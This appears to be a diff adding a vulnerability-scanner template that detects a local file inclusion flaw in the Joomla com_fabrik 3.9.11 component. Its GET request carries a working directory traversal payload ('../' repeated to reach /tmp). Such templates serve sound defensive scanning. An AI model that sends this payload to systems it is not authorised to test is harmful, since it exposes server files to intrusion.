@@ -1,0 +1,33 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"value":'
+            - '"disable":false'
+            - text
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/index.php?option=com_fabrik&task=plugin.pluginAjax&plugin=image&g=element&method=onAjax_files&folder=../../../../../../../../../../../../../../../tmp/'
+id: joomla-com-fabrik-lfi
+info:
+    author: dhiyaneshDk
+    classification:
+        cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+        cvss-score: 7.5
+        cwe-id: CWE-22
+    description: Joomla! com_fabrik 3.9.11 is vulnerable to local file inclusion.
+    metadata:
+        max-request: 1
+    name: Joomla! com_fabrik 3.9.11 - Local File Inclusion
+    reference:
+        - https://www.exploit-db.com/exploits/48263
+    severity: high
+    tags:
+        - edb
+        - Joomla
